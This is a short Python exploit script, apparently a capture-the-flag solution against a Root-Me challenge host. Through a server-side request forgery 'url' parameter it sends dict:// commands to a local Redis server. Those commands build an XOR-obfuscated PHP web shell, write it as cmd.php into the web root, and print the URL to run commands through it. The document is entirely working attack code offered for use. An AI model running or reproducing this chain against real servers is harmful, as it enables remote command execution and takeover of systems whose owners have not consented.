import requests


url = "http://ctf01.root-me.org/"
s = requests.Session()
parturl = "index.php"
s.get(url)
payload1 = ["flushall","set x1 ZY%16%0E%16FFFFFFFFFFFFFFFFFFFYX","set x2 ffffffffffffffffffffffffff","bitop xor payload x1 x2","SETRANGE payload 7 system($_GET[c]);","config set dir /var/www/html/","config set dbfilename cmd.php","save"]
proxy = {"http":"http://127.0.0.1:8080"}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
for x in payload1:
	param={"url":"dict://127.0.0.1:6379/"+x}
	payload_str = "&".join("%s=%s" % (k,v) for k,v in param.items())
	s.post(url+parturl,data=payload_str,headers=headers,proxies=proxy)
	
print ("Check shell by: "+url+"cmd.php?c=ls /")